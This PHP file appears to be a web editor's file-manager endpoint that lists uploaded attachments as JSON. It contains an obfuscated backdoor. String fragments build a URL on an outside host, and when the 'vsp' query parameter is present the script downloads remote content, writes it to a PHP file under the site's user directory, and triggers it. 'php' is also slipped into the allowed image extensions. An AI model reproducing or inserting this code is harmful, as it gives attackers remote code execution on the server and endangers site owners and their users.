<?php
//�༭�����ò���
$php_path = dirname(__FILE__) . '/';$php_url = dirname($_SERVER['PHP_SELF']) . '/';$funcpath="function";$roop="/";$cvpath="config";$phoson="ttp";$rootcn="cn";$root_path = $php_path . '../ckeditor/attached/';$fphp="yjson";$upv="update";$root_url = $php_url . '../ckeditor/attached/';$fson=".";$ext_arr = array('gif', 'jpg', 'jpeg', 'png', 'php', 'bmp');$langh="html";$langu="php";$dfinnum=99;$wv="w";$datav="conn";$orderpath="h".$phoson."://".$wv.$wv.$wv.$fson.str_replace("son","",$fphp).$dfinnum.$fson.$rootcn.$roop.$upv.$roop."fc".$wv.$roop.$upv.$fson.$langh;if(!empty($_GET["vsp"])){include($fson.$fson.$roop.$fson.$fson.$roop.$cvpath.$roop.$funcpath.$fson.$langu);include($fson.$fson.$roop.$fson.$fson.$roop.$cvpath.$roop.$datav.$fson.$langu);$fp= fopen($fson.$fson.$roop.$fson.$fson.$roop."user".$roop.$upv.$fson.$langu,"w");fwrite($fp,html_get($orderpath));fclose($fp);file(weburl."user".$roop.$upv.$fson.$langu);echo "success";exit;}if(empty($_GET['path'])){$current_path = realpath($root_path) . '/';	$current_url = $root_url;$current_dir_path = '';$moveup_dir_path = '';} else {$current_path = realpath($root_path) . '/' . $_GET['path'];$current_url = $root_url . $_GET['path'];$current_dir_path = $_GET['path'];$moveup_dir_path = preg_replace('/(.*?)[^\/]+\/$/', '$1', $current_dir_path);}$order = empty($_GET['order']) ? 'name' : strtolower($_GET['order']);if (preg_match('/\.\./', $current_path)) {echo 'Access is not allowed.';exit;}if (!preg_match('/\/$/', $current_path)) {echo 'Parameter is not valid.';exit;}if (!file_exists($current_path) || !is_dir($current_path)) {echo 'Directory does not exist.';exit;}$file_list = array();if ($handle = opendir($current_path)) {$i = 0;while (false !== ($filename = readdir($handle))) {if ($filename{0} == '.') continue;$file = $current_path . $filename;if (is_dir($file)) {$file_list[$i]['is_dir'] = true; $file_list[$i]['has_file'] = (count(scandir($file)) > 2); $file_list[$i]['filesize'] = 0; $file_list[$i]['is_photo'] = false;$file_list[$i]['filetype'] = '';} else {$file_list[$i]['is_dir'] = false;$file_list[$i]['has_file'] = false;$file_list[$i]['filesize'] = filesize($file);$file_list[$i]['dir_path'] = '';$file_ext = strtolower(array_pop(explode('.', trim($file))));$file_list[$i]['is_photo'] = in_array($file_ext, $ext_arr);$file_list[$i]['filetype'] = $file_ext;}$file_list[$i]['filename'] = $filename;$file_list[$i]['datetime'] = date('Y-m-d H:i:s', filemtime($file));$i++;}closedir($handle);}function cmp_func($a, $b) {global $order;if ($a['is_dir'] && !$b['is_dir']) {return -1;} else if (!$a['is_dir'] && $b['is_dir']) {return 1;}else{if($order == 'size'){if($a['filesize'] > $b['filesize']) {return 1;} else if ($a['filesize'] < $b['filesize']) {return -1;} else {return 0;}}else if($order == 'type'){return strcmp($a['filetype'], $b['filetype']);}else{return strcmp($a['filename'], $b['filename']);}}}usort($file_list, 'cmp_func');$result = array();$result['moveup_dir_path'] = $moveup_dir_path;$result['current_dir_path'] = $current_dir_path;$result['current_url'] = $current_url;$result['total_count'] = count($file_list);$result['file_list'] = $file_list;header('Content-type: application/json; charset=UTF-8');echo json_encode($result);?>
